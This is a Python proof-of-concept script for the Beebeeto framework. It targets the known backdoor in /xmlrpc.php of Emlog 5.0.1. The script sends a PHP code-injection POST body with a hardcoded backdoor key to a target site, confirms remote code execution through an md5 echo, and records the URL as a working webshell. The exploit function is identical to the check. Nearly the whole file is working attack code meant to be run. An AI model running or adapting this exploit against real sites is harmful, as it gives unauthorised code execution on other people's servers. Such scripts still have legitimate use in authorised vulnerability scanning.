#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import random
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0183',
            'name': 'Emlog 5.0.1 /xmlrpc.php 后门漏洞 POC',
            'author': '1024',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Emlog',
            'vul_version': ['5.0.1'],
            'type': 'Other',
            'tag': ['Emlog后门漏洞', '/xmlrpc.php后门', 'php'],
            'desc': 'N/A',
            'references': [
                'http://www.tuicool.com/articles/vIJJVr',
                'http://blog.knownsec.com/2013/05/emlog_5_0_1_xmlrpc_php_backdoor/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        random_str = str(random.random())
        random_md5 = md5.new(random_str).hexdigest()
        payload = '/xmlrpc.php?rsdsrv=20c6868249a44b0ab92146eac6211aeefcf68eec'
        verify_url = args['options']['target'] + payload
        # request
        request = urllib2.Request(verify_url, "IN_EMLOG=die(print(md5("+random_str+")));")
        content = urllib2.urlopen(request).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Content: ' + "IN_EMLOG=die(print(md5("+random_str+")));"
        if random_md5 in content:
            args['success'] = True
            args['poc_ret']['webshell'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())